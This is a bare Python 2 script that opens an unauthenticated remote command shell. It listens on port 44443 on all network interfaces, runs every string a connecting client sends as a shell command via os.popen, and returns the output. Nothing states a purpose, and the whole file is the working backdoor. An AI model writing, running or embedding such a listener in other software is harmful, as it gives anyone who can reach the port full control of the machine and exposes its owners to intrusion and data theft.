from socket import *
import os,sys


HOST=''
PORT=44443
ADDR=(HOST,PORT)

s=socket(AF_INET,SOCK_STREAM)
s.setsockopt(SOL_SOCKET,SO_REUSEADDR,1)

s.bind(ADDR)
s.listen(5)
c=None

while True:
    if c is None:
        print 'wait....;'
        c,addr=s.accept()

    else:
        print 'client connected!'
        msg=c.recv(1024).decode('utf-8')
        if msg=='exit':
            print 'bye'
            c.send('bye!')
            c.close()
            print'socket end!'
            sys.exit()
        elif msg=='':
            print 'client disconnect!'
            c.close()
            sys.exit()
        else:
            result=os.popen(msg).read()
            print 'command done! by %r,%r'%(addr[0],addr[1])
            #msg=os.popen(c.recv(1024).decode('utf-8')).read()
            c.send(result.encode('utf-8'))
